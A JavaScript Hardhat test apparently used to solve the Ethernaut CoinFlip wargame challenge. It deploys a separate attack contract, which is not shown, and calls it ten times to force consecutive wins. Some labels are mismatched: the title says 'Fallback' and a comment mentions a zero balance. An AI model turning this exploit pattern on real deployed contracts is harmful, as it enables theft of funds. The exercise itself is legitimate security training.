const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("Fallback Exploit using attack contract", function () {
  let attacker, attackerContract, coinFlipContract, consecutiveWins;

  before("Setup for attack", async function () {
    [attacker] = await ethers.getSigners();
    contractAddress = "0x7165AB8bf504066838CfF672005d0EadAe5cb2C6";
    // Deploy my own attacker contract
    const attackerContractFactory = await ethers.getContractFactory("Attack");
    attackerContract = await attackerContractFactory.deploy(contractAddress);

    await attackerContract.deployed();

    // insert contract address of ethernaut challenge
    coinFlipContract = await ethers.getContractAt("CoinFlip", contractAddress);

    console.log("the coinflip contract is this", coinFlipContract);
  });

  it("perform exploit", async function () {
    // Attack flow
    // will exceed 10 if attempted multiple times
    for (i = 0; i < 10; i++) {
      let txAttack = await attackerContract.attack();

      // wait for attack to complete
      let attackReciept = await txAttack.wait();
      console.log("The receipt looks like this", attackReciept);

      consecutiveWins = await coinFlipContract.consecutiveWins();
      console.log("consecutive wins", consecutiveWins);
    }
  }).timeout(3000000); //Allows the attack to be ran for 30 seconds

  after("confirm exploit", async function () {
    // check if the balance is 0
    expect(consecutiveWins).to.be.gte("10");
  });
});
